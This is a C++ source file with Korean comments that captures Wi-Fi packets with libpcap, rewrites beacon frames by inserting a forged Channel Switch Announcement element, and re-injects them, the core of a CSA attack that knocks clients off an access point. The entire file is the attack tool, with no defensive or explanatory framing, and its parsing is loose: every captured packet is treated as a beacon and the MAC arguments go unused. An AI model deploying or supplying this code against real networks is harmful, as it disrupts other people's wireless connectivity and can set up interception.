#include <iostream>
#include <pcap.h>
#include <cstring>
#include <map>
#include <vector>
#include <sstream>
#include <iomanip>

// IEEE 802.11 Radiotap Header
class RadiotapHeader {
public:
    uint8_t version;
    uint8_t pad;
    uint16_t len;

    RadiotapHeader(const uint8_t* data) {
        version = data[0];
        pad     = data[1];
        len     = *((uint16_t*)(data + 2));
    }
};

// IEEE 802.11 Header 클래스
class IEEE80211Header {
public:
    uint16_t frameControl;
    uint16_t durationID;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t sequenceControl;

    // raw 데이터에서 파싱
    void parse(const uint8_t* data) {
        frameControl    = *((uint16_t*)(data));
        durationID      = *((uint16_t*)(data + 2));
        memcpy(addr1, data + 4, 6);
        memcpy(addr2, data + 10, 6);
        memcpy(addr3, data + 16, 6);
        sequenceControl = *((uint16_t*)(data + 22));
    }
};

// 단일 정보 요소(IE)를 표현하는 클래스
class InfoElement {
public:
    uint8_t id;
    uint8_t length;
    std::vector<uint8_t> data;

    InfoElement() : id(0), length(0) {}

    // raw 데이터로부터 파싱 (data는 IE 시작 위치)
    // 실제 파싱 후 길이(IE 전체 크기)는 2 + length
    size_t parse(const uint8_t* raw) {
        id     = raw[0];
        length = raw[1];
        data.resize(length);
        memcpy(data.data(), raw + 2, length);
        return 2 + length;
    }

    // CSA IE 생성 (예시: 태그 번호 0x25)
    static InfoElement createCSA(uint8_t newChannel, uint8_t switchCount) {
        InfoElement ie;
        ie.id = 0x25; // CSA 태그 번호
        ie.length = 3; // 예시 길이
        ie.data.push_back(0x01);            // 채널 전환 모드 (예: 1)
        ie.data.push_back(newChannel);        // 새 채널
        ie.data.push_back(switchCount);         // 채널 전환 카운트
        return ie;
    }
};

// Beacon Frame 클래스
class BeaconFrame {
public:
    IEEE80211Header header;
    uint8_t timestamp[8];
    uint16_t beaconInterval;
    uint16_t capabilities;
    std::map<uint8_t, InfoElement> infoElements;

    // raw 데이터 파싱 (radiotap 헤더 뒤부터 시작하는 beacon 프레임)
    void parse(const uint8_t* data, size_t len) {
        // IEEE 802.11 헤더 파싱 (예: radiotap 헤더 길이만큼 오프셋)
        header.parse(data);
        // 고정 필드 파싱: timestamp(8), beaconInterval(2), capabilities(2)
        memcpy(timestamp, data + sizeof(IEEE80211Header), 8);
        beaconInterval = *((uint16_t*)(data + sizeof(IEEE80211Header) + 8));
        capabilities   = *((uint16_t*)(data + sizeof(IEEE80211Header) + 10));

        // IE 파싱: 고정 필드 이후부터 시작 (예시 오프셋)
        size_t offset = sizeof(IEEE80211Header) + 12;
        while (offset < len) {
            InfoElement ie;
            size_t ieSize = ie.parse(data + offset);
            infoElements[ie.id] = ie;
            offset += ieSize;
        }
    }

    // CSA IE 삽입: 기존 IE들 중 적절한 위치에 CSA IE를 추가한다고 가정
    void insertCSA(uint8_t newChannel, uint8_t switchCount) {
        InfoElement csaIE = InfoElement::createCSA(newChannel, switchCount);
        // 단순하게 map에 삽입 (출력 순서는 빌드 시 정렬하거나 별도 관리)
        infoElements[csaIE.id] = csaIE;
    }

    // BeaconFrame을 raw 바이트 배열로 직렬화하는 예시 (간략화)
    std::vector<uint8_t> buildFrame() {
        std::vector<uint8_t> frame;
        // IEEE80211Header 직렬화 (간단한 예)
        frame.resize(sizeof(IEEE80211Header));
        memcpy(frame.data(), &header, sizeof(IEEE80211Header));

        // 고정 필드 직렬화
        frame.insert(frame.end(), timestamp, timestamp + 8);
        uint16_t interval = beaconInterval;
        frame.insert(frame.end(), reinterpret_cast<uint8_t*>(&interval), reinterpret_cast<uint8_t*>(&interval) + 2);
        uint16_t cap = capabilities;
        frame.insert(frame.end(), reinterpret_cast<uint8_t*>(&cap), reinterpret_cast<uint8_t*>(&cap) + 2);

        // IE 직렬화
        for (const auto& kv : infoElements) {
            const InfoElement& ie = kv.second;
            frame.push_back(ie.id);
            frame.push_back(ie.length);
            frame.insert(frame.end(), ie.data.begin(), ie.data.end());
        }
        return frame;
    }
};

// 패킷 전송 함수 개선 (새롭게 빌드한 프레임 전송)
void sendPacket(const std::string& dev, const std::vector<uint8_t>& packet) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        std::cerr << "디바이스 " << dev << " 열기 실패: " << errbuf << std::endl;
        return;
    }
    std::cout << "packet size: " << int(packet.size()) << std::endl;
    for (size_t i = 0; i < packet.size(); i++) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)packet[i] << " ";
        if ((i + 1) % 16 == 0) std::cout << std::endl;
    }
    if (pcap_sendpacket(handle, packet.data(), packet.size()) != 0) {
        std::cerr << "패킷 전송 오류: " << pcap_geterr(handle) << std::endl;
    } else {
        std::cout << "패킷 전송 완료" << std::endl;
    }
    pcap_close(handle);
}

// 예시: broadcast 처리 (unicast도 유사하게 처리)
void processBroadcast(const std::string& dev, const uint8_t* rawPacket, size_t len, uint8_t newChannel, uint8_t switchCount) {
    // 출력
    std::cout << "========================================" << std::endl;
    std::cout << "패킷 수신: " << len << "바이트" << std::endl;
    for (size_t i = 0; i < len; i++) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)rawPacket[i] << " ";
        if ((i + 1) % 16 == 0) std::cout << std::endl;
    }
    
    // Radiotap 헤더 파싱 (예시: 첫 4바이트만 사용)
    RadiotapHeader rtHeader(rawPacket);
    size_t offset = rtHeader.len; // radiotap 헤더 이후부터 실제 beacon 프레임 시작

    BeaconFrame beacon;
    beacon.parse(rawPacket + offset, len - offset);
    
    // 예시: source address 비교 등 추가 검증 로직 삽입 가능

    // CSA IE 삽입
    beacon.insertCSA(newChannel, switchCount);

    // BeaconFrame을 다시 직렬화하고, radiotap 헤더와 합쳐 최종 패킷 생성
    std::vector<uint8_t> newPacket;
    newPacket.insert(newPacket.end(), rawPacket, rawPacket + rtHeader.len);
    std::vector<uint8_t> beaconFrame = beacon.buildFrame();
    newPacket.insert(newPacket.end(), beaconFrame.begin(), beaconFrame.end());

    // 패킷 전송
    sendPacket(dev, newPacket);
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "사용법: " << argv[0] << " <인터페이스> <apMAC> [<stationMAC>]" << std::endl;
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcapHandle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (!pcapHandle) {
        std::cerr << "pcap_open_live 실패: " << errbuf << std::endl;
        return -1;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const uint8_t* packet;
        int res = pcap_next_ex(pcapHandle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            std::cerr << "pcap_next_ex 에러: " << pcap_geterr(pcapHandle) << std::endl;
            break;
        }

        processBroadcast(argv[1], packet, header->caplen, 0x01, 0x9);
    }

    pcap_close(pcapHandle);
    return 0;
}
